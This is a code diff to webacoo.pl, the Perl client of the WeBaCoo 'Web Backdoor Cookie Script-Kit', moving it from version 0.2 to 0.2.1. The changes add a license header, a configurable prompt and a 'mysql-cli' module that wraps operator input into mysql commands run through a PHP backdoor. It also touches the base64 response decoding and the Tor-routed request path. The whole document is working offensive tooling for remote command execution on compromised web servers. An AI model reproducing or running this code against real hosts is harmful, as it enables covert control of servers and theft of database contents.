@@ -1,4 +1,20 @@
 #!/usr/bin/perl
+# WeBaCoo - Web Backdoor Cookie Scripkit
+# Copyright(c) 2011-2012 Anestis Bechtsoudis
+# Website: https://github.com/anestisb/WeBaCoo
+
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 use strict;
 use warnings;
@@ -17,7 +33,7 @@ my @phpsf = ("system", "shell_exec", "exec", "passthru", "popen");
 
 # Setup
 $WEBACOO{name} = "webacoo.pl";
-$WEBACOO{version} = '0.2';
+$WEBACOO{version} = '0.2.1';
 $WEBACOO{description} = 'Web Backdoor Cookie Script-Kit';
 $WEBACOO{author} = 'Anestis Bechtsoudis';
 $WEBACOO{email} = 'anestis@bechtsoudis.com';
@@ -36,9 +52,14 @@ $WEBACOO{proxy_port} = '';
 $WEBACOO{vlevel} = 0;				# Default verbose level=0
 $WEBACOO{tor_ip} = "127.0.0.1";			# Default tor ip
 $WEBACOO{tor_port} = "9050";			# Default tor port
+$WEBACOO{shell_name} = "webacoo";		# Shell name
+$WEBACOO{shell_head} = '$ ';			# Shell head character
 
 ## Help Global Variables ##
 my $command = '';
+my $loaded_module = '';
+my $module_ext_head = '';
+my $module_ext_tail = '';
 my $request = '';
 my $output = '';
 my $sock = '';
@@ -146,21 +167,30 @@ if(defined $args{t}) {
     else { cmd_request(); }
     print "\n";
 
-    # Print quit help message
-    print "Type 'exit' to quit terminal.\n\n";
+    # Print help messages
+    print "[!] Type 'load' to use an extension module.\n";
+    print "[!] Type 'exit' to quit terminal.\n\n";
 
     # "Terminal" connection loop
     while(1) {
         # Check if terminal before user interraction
-        if(-t STDOUT) { print BOLD,RED"webacoo",BLUE,'$ ',RESET; }
+        if(-t STDOUT) { 
+            print BOLD,RED,$WEBACOO{shell_name},BLUE,$WEBACOO{shell_head},RESET; 
+        }
 	else { print '[-] Need to run under terminal.'; exit; }
     	chop($command=<STDIN>);
 
 	# Exit if "exit" is typed
     	if($command eq "exit") { print "Bye...\n"; last; }
+	# Check for module load function
+	elsif($command eq "load") { load_module(); next; }
+        # Check for module unload function
+	elsif($command eq "unload") { unload_module(); next; }
 
 	# If no user specified delimiter, set a new random one for each request
 	random_delim() if(!defined $args{d});
+
+	# Follow the relative branch (normal or through TOR)
     	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request("1"); }
         else { cmd_request("1"); }
     }
@@ -179,7 +209,7 @@ sub print_logo
     if(-t STDOUT) {
     	print "\n",BLUE,BOLD,"\tWeBaCoo $WEBACOO{version}",RESET;
     	print BLUE," - $WEBACOO{description}\n";
-    	print GREEN,"\tWritten by ",RESET,GREEN,BOLD,"$WEBACOO{author}\n",RESET;
+        print GREEN,"\tCopyright (C) 2011-2012 ",RESET,GREEN,BOLD,"$WEBACOO{author}\n",RESET;
     	print GREEN,"\t{ ",YELLOW,"$WEBACOO{twitter} ",GREEN,"|",YELLOW," $WEBACOO{email} ";
     	print GREEN,"|",YELLOW," $WEBACOO{website}",GREEN," }\n\n",RESET;
 
@@ -188,7 +218,7 @@ sub print_logo
     }
     else {
 	print "\n\tWeBaCoo $WEBACOO{version} - $WEBACOO{description}\n";
-        print "\tWritten by $WEBACOO{author}\n";
+        print "\tCopyright (C) 2011-2012 $WEBACOO{author}\n";
         print "\t{ $WEBACOO{twitter} | $WEBACOO{email} | $WEBACOO{website} }\n\n";
     }
 }
@@ -316,6 +346,9 @@ sub cmd_request
     my $dst_host = $WEBACOO{rhost};
     my $dst_port = $WEBACOO{rport};
 
+    # Append & prepend extension modules data
+    $command = $module_ext_head.$command.$module_ext_tail;
+
     # Check for Proxy args
     if(defined $args{p}) { 
 	@pargs=split(':',$args{p});
@@ -396,7 +429,14 @@ sub cmd_request
         print "[!] Backdoor PHP system function possibly disabled.\n";
     }
     # Decode response and print output
-    else { print decode_base64($output); }
+    else { 
+        $output = decode_base64($output);
+        # Beautify in case of mysql-cli module
+	if($loaded_module eq "mysql-cli") {
+	    $output =~ s/\n/\n\n/;
+        }
+	print $output; 
+    }
 
     # Flush content buffers
     @verdata = ();
@@ -459,6 +499,9 @@ sub tor_cmd_request
 {
     # Silent flag
     my $silent = @_;
+
+    # Append & prepend extension modules data
+    $command = $module_ext_head.$command.$module_ext_tail;
 
     # Form GET request
     $request = "GET http://$WEBACOO{rhost}$WEBACOO{uri} HTTP/1.1\r\n";
@@ -527,7 +570,14 @@ sub tor_cmd_request
         print "[!] Backdoor PHP system function possibly disabled.\n";
     }
     # Decode response and print output
-    else { print decode_base64($output); }
+    else {
+        $output = decode_base64($output);
+        # Beautify in case of mysql-cli module
+        if($loaded_module eq "mysql-cli") {
+            $output =~ s/\n/\n\n/;
+        }
+        print $output;
+    }
 
     # Flush content buffers
     @verdata = ();
@@ -553,4 +603,56 @@ sub random_delim
       $WEBACOO{delim}.=$vchars[rand @vchars];
     }
     $WEBACOO{delim}.=$nvchars[rand @nvchars];
+}
+
+#################################################################################
+# Load extension modules
+sub load_module
+{
+    my $mod_input = '';
+   
+    # Check if another module is loaded
+    if($loaded_module) { 
+	print "[-] Another module is loaded. Unload the old one first.\n";
+	return;
+    }
+
+    # Print available modules
+    print "[!] Type the module name with the correct arguments.\n\n";
+    print "Currently available extension modules:\n";
+    print "    mysql-cli <host> <user> <pass>\n\n";
+
+    # Get user's choice
+    print '> ';
+    chop($mod_input=<STDIN>);
+
+    # Check input
+    my @modargs=split(' ',$mod_input);
+    if (@modargs != 4) { print "[-] Error loading the module\n"; return; }
+
+    # Check fom mysql-cli module (will be evolved when more modules are added)
+    if ($modargs[0] ne "mysql-cli") { print "[-] Unknown module name\n"; return; }
+
+    # Print module help messages
+    print "[+] $modargs[0] module successfully loaded.\n\n";
+    print "[!] Type 'unload' to unload the module and return to the original cmd.\n\n";
+
+    # Update module related global variables
+    $loaded_module = "mysql-cli";
+    $WEBACOO{shell_name} = "mysql-cli";
+    $WEBACOO{shell_head} = "> ";
+    $module_ext_head = "mysql -h $modargs[1] -u$modargs[2] -p$modargs[3] -e '";
+    $module_ext_tail = "'";
+}
+
+#################################################################################
+# Unload extension modules
+sub unload_module
+{
+    # Revert to initial state the module related global variables
+    $WEBACOO{shell_name} = "webacoo";
+    $WEBACOO{shell_head} = '$ ';
+    $loaded_module = '';
+    $module_ext_head = '';
+    $module_ext_tail = '';
 }
